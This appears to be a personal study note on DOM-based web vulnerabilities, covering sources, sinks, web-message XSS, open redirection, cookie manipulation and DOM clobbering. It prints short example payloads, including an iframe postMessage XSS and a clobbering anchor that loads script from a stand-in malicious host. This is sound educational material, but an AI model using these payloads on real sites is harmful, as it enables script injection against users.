# DOM-Based Vulnerabilities
#DOM #XSS 

DOM-based vulnerabilities arise when a website passes data from a [[DOM-Based Vulnerabilities#Sources|source]] to a [[DOM-Based Vulnerabilities#Sinks|sink]], which then handles the data in an **unsafe** way in the context of the client's **session**.

## Sources
A source is a JavaScript property that **accepts data** that is potentially **attacker-controlled**.

The following are common examples of sources which can be used to exploit a number of vulnerabilities:

* `document.URL`
* `document.documentURI`
* `document.URLUnencoded`
* `document.baseURI`
* `location`
* `document.cookie`
* `document.referrer`
* `window.name`
* `history.pushState`
* `history.replaceState`
* `localStorage`
* `sessionStorage`
* `IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)`
* `Database`

## Sinks
A sink is a potentially **dangerous** JavaScript function or DOM object that can cause **undesirable** effects if **attacker-controlled data** is passed to it. For example, the `eval()` function is a sink because it **processes** the argument that is **passed to** it as JavaScript. See the table below for a number of **DOM-based** vulnerabilities and an example of an associated **sink**:

|DOM-Based Vulnerability|Example Sink|
|---|---|
|[[Cross-Site Scripting (XSS)#DOM-Based \| DOM XSS]]|`docuent.write()`|
|Open Redirection|`window.location`|
|Cookie Manipulation|`document.cookie`|
|JavaScript injection|`eval()`|
|Document-domain manipulation|`document.domain`|
|[[WebSockets \| Websocket]]-URL poisoning|`WebSocket()`|
|Link manipulation|`element.src`|
|Web message manipulation|`postMessage()`|
|Ajax request-header manipulation|`setRequestHeader()`|
|Local file-path manipulation|`FileReader.readAsText()`|
|Client-side [[SQL injection]]|`ExecuteSql()`|
|HTML5-storage manipulation|`sessionStorage.setItem()`|
|Client-side XPath injection|`document.evaluate()`|
|Client-side JSON injection|`JSON.parse()`|
|DOM-data manipulation|`element.setAttribute()`|
|Denial of service|`RegExp()`|

## Web Messages
Consider the following JavaScript code using **web messages**:
```JavaScript
window.addEventListener('message', function(e) {
  eval(e.data);
});
```

This would be vulnerable as an attacker could use an **iframe** to conduct a [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md) attack:
`<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('<img src onerror=\'print()\'>','*')">`

## Open Redirection
DOM-based **open-redirection** vulnerabilities arise when a script writes attacker-controllable data into a [[DOM-Based Vulnerabilities#Sinks|sink]] that can trigger **cross-domain navigation**. For example, the following code is vulnerable due to the **unsafe** way it handles the `location.hash` property:
```JavaScript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```

This behavior can be used for **phishing** attacks against users of the website, for example. The ability to use an **authentic** application URL targeting the correct domain lends credibility to the phishing attack because many users, even if they verify these features, will **not** notice the subsequent **redirection** to a different domain.

## Cookie Manipulation
Some vulnerabilities allow attackers to **change** data that they do not typically control. This transforms normally-safe data types, such as **cookies**, into potential [[DOM-Based Vulnerabilities#Sources|sources]]. DOM-based cookie-manipulation vulnerabilities arise when a script writes **attacker-controllable** data into the value of a **cookie**.

An attacker may be able to use this vulnerability to construct a **URL** that, if visited by another user, will set an arbitrary value in the user's **cookie**:
`document.cookie = 'cookieName='+location.hash.slice(1);`

## DOM Clobbering
DOM clobbering is where you **inject** HTML in order to manipulate the DOM and ultimately change the behavior of **JavaScript** on the page. DOM clobbering is particularly useful in cases where [[Cross-Site Scripting (XSS)]] is not possible, but you can control **some** HTML on a page where the attributes `id` or `name` are **whitelisted** by the HTML filter. 

The most **common** form of DOM clobbering uses an **anchor** element to **overwrite** a global variable, which is then used by the application in an unsafe **way**, such as generating a **dynamic** script URL.

Take the following code, for example:
```JavaScript
window.onload = function(){
	let someObject = window.someObject || {};
	let script = document.createElement('script');
	script.src = someObject.url;
	document.body.appendChild(script);
};
```

To **exploit** this vulnerable code, you could **inject** the following HTML to clobber the `someObject` reference with an anchor element:
`<a id=someObject><a id=someObject name=url href="//malicious-website.com/evil.js">`

Another example of DOM clobbering is to use the `form` element along with an element such as `input` to **clobber** DOM properties. For example, clobbering the attributes property enables you to **bypass** client-side **filters** that use it in their **logic**.
`<form onclick=alert(1)><input id=attributes>Click me`